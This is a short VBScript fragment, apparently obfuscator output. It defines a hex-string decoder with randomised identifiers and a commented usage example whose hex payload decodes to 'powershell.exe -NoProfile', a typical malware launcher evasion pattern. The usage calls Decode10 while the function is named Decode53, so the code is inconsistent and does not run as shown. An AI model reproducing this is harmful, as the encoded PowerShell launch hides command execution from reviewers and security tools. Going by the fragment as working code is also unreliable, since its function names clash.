Function Decode53(h50_CmKBdT)
    Dim r51_lkiLKDWbC, i52_pLuvl, l53_Vqbjx
    l53_Vqbjx = Len(h50_CmKBdT)
    i52_pLuvl = 1
    r51_lkiLKDWbC = ""
    Do Until i52_pLuvl > l53_Vqbjx
        r51_lkiLKDWbC = r51_lkiLKDWbC & Chr(CLng("&H" & Mid(h50_CmKBdT, i52_pLuvl, 2)))
        i52_pLuvl = i52_pLuvl + 2
    Loop
    Decode53 = r51_lkiLKDWbC
End Function

'' Complete script usage:
'' Dim hexPayload
'' hexPayload = "706f7765727368656c6c2e657865202d4e6f50726f66696c65"
'' Dim result
'' result = Decode10(hexPayload)
'' WScript.Echo result
